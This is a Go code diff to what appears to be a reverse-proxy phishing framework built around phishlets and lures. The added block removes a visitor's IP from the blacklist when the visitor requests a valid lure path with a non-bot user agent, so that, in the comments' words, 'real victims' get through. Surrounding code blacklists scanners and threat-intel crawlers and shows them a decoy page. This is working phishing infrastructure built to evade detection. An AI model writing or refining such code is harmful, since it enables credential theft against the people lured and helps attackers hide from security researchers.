@@ -207,6 +207,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return rq, rs
 			}
 
+			// Pre-check: if this request is for a valid lure path on a known phishing
+			// host AND the UA is not an obvious bot, whitelist the IP so the blacklist
+			// check below doesn't block real victims (or the admin testing links).
+			{
+				preCheckPl := p.getPhishletByPhishHost(req.Host)
+				if preCheckPl != nil && !IsKnownBot(req.UserAgent()) && strings.TrimSpace(req.UserAgent()) != "" {
+					plName := preCheckPl.Name
+					_, errLure := p.cfg.GetLureByPath(plName, req.Host, req.URL.Path)
+					if errLure == nil {
+						// Valid lure path — ensure IP is not blacklisted so the victim gets through.
+						p.bl.RemoveIP(from_ip)
+					}
+				}
+			}
+
 			// Anti-bot: detect scanners/threat-intel crawlers before anything else.
 			// Permanently blacklists the IP+subnet and returns a clean decoy page.
 			if isBot, rq, rs := CheckAndBlockBot(req, from_ip, p.bl, p.cfg.GetCloudflareMode()); isBot {
